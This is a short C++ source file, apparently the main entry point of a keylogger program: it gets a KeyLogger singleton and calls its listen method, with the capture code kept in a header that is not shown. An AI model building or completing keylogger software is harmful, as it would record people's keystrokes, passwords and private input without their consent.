#include "keylogger.h"


int main(int argc, char *argv[]) {

    KeyLogger* kl = KeyLogger::getInstance();
    kl->listen();

    return 0;
}
